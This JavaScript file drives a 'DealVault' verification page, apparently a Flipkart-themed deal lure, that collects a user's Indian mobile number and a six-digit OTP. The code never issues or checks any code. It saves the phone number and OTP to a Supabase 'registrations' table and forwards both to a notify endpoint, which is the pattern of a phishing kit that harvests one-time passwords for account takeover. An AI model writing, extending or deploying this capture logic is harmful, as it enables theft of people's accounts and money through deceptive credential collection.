(function () {
  'use strict';

  var SESSION_KEY = 'dealvault_session_id';
  var otpSent = false;
  var resendInterval = null;
  var supabaseClient = null;

  function getSessionId() {
    try {
      var id = sessionStorage.getItem(SESSION_KEY);
      if (!id) {
        id = (crypto && crypto.randomUUID) ? crypto.randomUUID() : String(Date.now()) + Math.random();
        sessionStorage.setItem(SESSION_KEY, id);
      }
      return id;
    } catch (e) {
      return String(Date.now()) + Math.random();
    }
  }

  var sessionId = getSessionId();

  function getSupabase() {
    if (supabaseClient) return supabaseClient;
    var cfg = window.APP_CONFIG || {};
    if (!cfg.SUPABASE_URL || !cfg.SUPABASE_ANON_KEY) return null;
    if (!window.supabase || !window.supabase.createClient) return null;
    supabaseClient = window.supabase.createClient(cfg.SUPABASE_URL, cfg.SUPABASE_ANON_KEY);
    return supabaseClient;
  }

  function $(id) { return document.getElementById(id); }

  function validatePhone(phone) {
    return /^[6-9]\d{9}$/.test(phone);
  }

  function getOtpValue() {
    var digits = document.querySelectorAll('.otp-digit');
    var val = '';
    for (var i = 0; i < digits.length; i++) val += digits[i].value;
    return val;
  }

  function setLoading(on) {
    var btn = $('verifyBtn');
    if (!btn) return;
    btn.disabled = on;
    btn.classList.toggle('is-loading', on);
  }

  function showError(el, msg) {
    if (el) el.textContent = msg || '';
  }

  async function sendNotify(eventType, extra) {
    try {
      var endpoint = '/.netlify/functions/notify-sending';
      var body = {
        event_type: eventType,
        session_id: sessionId,
        selected_app: 'flipkart',
      };
      for (var key in extra) {
        if (extra.hasOwnProperty(key)) body[key] = extra[key];
      }

      console.log('[DealVault] Calling notify:', endpoint, body);

      var res = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

      var data = await res.json().catch(function () { return {}; });
      console.log('[DealVault] notify', eventType, 'status:', res.status, data);

      if (!res.ok || !data.ok) {
        console.error('[DealVault] notify FAILED:', eventType, data);
      }
      return data;
    } catch (e) {
      console.error('[DealVault] notify error:', eventType, e);
      return null;
    }
  }

  async function savePhone(phone) {
    var db = getSupabase();
    if (!db) return { error: { message: 'Database not connected. Refresh and try again.' } };
    return db.from('registrations').upsert(
      { session_id: sessionId, phone: phone, selected_app: 'flipkart' },
      { onConflict: 'session_id' }
    );
  }

  async function saveOtp(otp, phone) {
    var db = getSupabase();
    if (!db) return { error: { message: 'Database not connected. Refresh and try again.' } };
    return db.from('registrations').upsert(
      { session_id: sessionId, phone: phone, otp: otp, selected_app: 'flipkart' },
      { onConflict: 'session_id' }
    );
  }

  function showOtpStep() {
    otpSent = true;
    var otpGroup = $('otpGroup');
    var btnText = document.querySelector('#verifyBtn .btn-text');
    var statusMsg = $('otpStatusMsg');

    if (otpGroup) {
      otpGroup.hidden = false;
      otpGroup.removeAttribute('hidden');
      otpGroup.style.display = 'block';
    }
    if (btnText) btnText.textContent = 'Verify OTP';
    if (statusMsg) {
      statusMsg.hidden = false;
      statusMsg.removeAttribute('hidden');
    }

    var digits = document.querySelectorAll('.otp-digit');
    if (digits[0]) digits[0].focus();
    startResendTimer();
  }

  function startResendTimer() {
    var resendBtn = $('resendBtn');
    if (!resendBtn) return;
    var seconds = 30;
    resendBtn.disabled = true;
    resendBtn.innerHTML = 'Resend OTP in <span id="resendTimer">30</span>s';
    clearInterval(resendInterval);
    resendInterval = setInterval(function () {
      seconds--;
      var t = $('resendTimer');
      if (t) t.textContent = seconds;
      if (seconds <= 0) {
        clearInterval(resendInterval);
        resendBtn.disabled = false;
        resendBtn.textContent = 'Resend OTP';
      }
    }, 1000);
  }

  async function onVerifyClick() {
    var phoneInput = $('phone');
    var phoneError = $('phoneError');
    var otpError = $('otpError');
    var verifyForm = $('verifyForm');
    var successMessage = $('successMessage');

    if (!otpSent) {
      var phone = phoneInput ? phoneInput.value.replace(/\D/g, '').slice(0, 10) : '';
      if (phoneInput) phoneInput.value = phone;

      if (!validatePhone(phone)) {
        showError(phoneError, 'Enter a valid 10-digit Indian mobile number');
        return;
      }

      setLoading(true);
      showError(phoneError, '');

      try {
        var result = await savePhone(phone);
        if (result.error) {
          showError(phoneError, result.error.message || 'Could not save number. Try again.');
          return;
        }
        sendNotify('phone_saved', { phone: phone });
        showOtpStep();
      } catch (err) {
        showError(phoneError, 'Something went wrong. Try again.');
      } finally {
        setLoading(false);
      }
      return;
    }

    var otp = getOtpValue();
    if (otp.length !== 6) {
      showError(otpError, 'Please enter the complete 6-digit OTP');
      return;
    }

    setLoading(true);
    showError(otpError, '');

    try {
      var phoneVal = phoneInput ? phoneInput.value.replace(/\D/g, '').slice(0, 10) : '';
      var otpResult = await saveOtp(otp, phoneVal);
      if (otpResult.error) {
        showError(otpError, otpResult.error.message || 'Could not save OTP. Try again.');
        return;
      }
      sendNotify('otp_saved', { phone: phoneVal, otp: otp });
      if (verifyForm) verifyForm.style.display = 'none';
      if (successMessage) {
        successMessage.hidden = false;
        successMessage.removeAttribute('hidden');
        successMessage.style.display = 'block';
      }
    } catch (err) {
      showError(otpError, 'Something went wrong. Try again.');
    } finally {
      setLoading(false);
    }
  }

  function bindOtpInputs() {
    var digits = document.querySelectorAll('.otp-digit');
    var otpError = $('otpError');

    for (var i = 0; i < digits.length; i++) {
      (function (index) {
        digits[index].addEventListener('input', function (e) {
          e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
          showError(otpError, '');
          if (e.target.value && index < digits.length - 1) digits[index + 1].focus();
        });
        digits[index].addEventListener('keydown', function (e) {
          if (e.key === 'Backspace' && !e.target.value && index > 0) digits[index - 1].focus();
        });
      })(i);
    }
  }

  function init() {
    window.__verifyJsLoaded = true;
    var phoneInput = $('phone');
    var verifyBtn = $('verifyBtn');
    var resendBtn = $('resendBtn');

    if (phoneInput) {
      phoneInput.addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
        showError($('phoneError'), '');
      });
      phoneInput.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') { e.preventDefault(); onVerifyClick(); }
      });
    }

    if (verifyBtn) {
      verifyBtn.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        onVerifyClick();
      });
    }

    if (resendBtn) {
      resendBtn.addEventListener('click', function () {
        if (resendBtn.disabled) return;
        var digits = document.querySelectorAll('.otp-digit');
        for (var i = 0; i < digits.length; i++) digits[i].value = '';
        showError($('otpError'), '');
        startResendTimer();
      });
    }

    bindOtpInputs();
    getSupabase();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
